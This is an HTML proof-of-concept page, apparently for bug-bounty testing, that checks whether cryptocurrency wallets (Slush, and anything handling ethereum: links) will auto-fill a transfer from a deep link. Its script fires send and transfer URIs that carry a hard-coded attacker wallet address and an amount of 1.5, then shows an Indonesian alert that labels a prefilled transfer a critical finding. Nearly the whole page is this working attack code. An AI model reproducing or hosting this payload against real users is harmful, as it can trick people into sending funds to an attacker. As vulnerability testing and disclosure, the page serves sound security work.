<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>PoC | Deep Link Auto-fill Transfer</title>
    <style>
        :root { --danger: #ff0055; --bg: #080808; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .test-card { border: 2px solid var(--danger); padding: 30px; border-radius: 15px; text-align: center; background: #111; box-shadow: 0 0 20px rgba(255, 0, 85, 0.3); }
        .btn-exploit { background: var(--danger); color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
        .status { margin-top: 15px; font-size: 12px; color: #888; font-family: monospace; }
    </style>
</head>
<body>

<div class="test-card">
    <h2 style="color:var(--danger)">URGENT: CRITICAL TEST</h2>
    <p>Uji coba pengisian otomatis transaksi (Auto-fill) melalui Deep Link.</p>
    
    <button class="btn-exploit" onclick="testAutofill()">TEST AUTO-FILL TRANSFER</button>
    
    <div class="status" id="log">> Awaiting interaction...</div>
</div>

<script>
    function testAutofill() {
        const log = document.getElementById('log');
        
   
        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
        const amount = "1.5";
        
      
        const deepLinks = [
            `slush://send?to=${attackerAddress}&amount=${amount}`,
            `slush://transfer?address=${attackerAddress}&uint256=${amount}`,
            `ethereum:${attackerAddress}?value=${amount}`
        ];

        log.innerText = "> Sending malicious URIs...";

        deepLinks.forEach((uri, index) => {
            setTimeout(() => {
                log.innerText = `> Triggering: ${uri}`;
                window.location.href = uri;
            }, index * 1000);
        });

        setTimeout(() => {
            alert("PERIKSA DOMPET ANDA:\nJika halaman transfer terbuka dengan alamat penyerang dan jumlah 1.5 sudah terisi otomatis, ini adalah temuan CRITICAL.");
        }, 3500);
    }
</script>

</body>
</html>
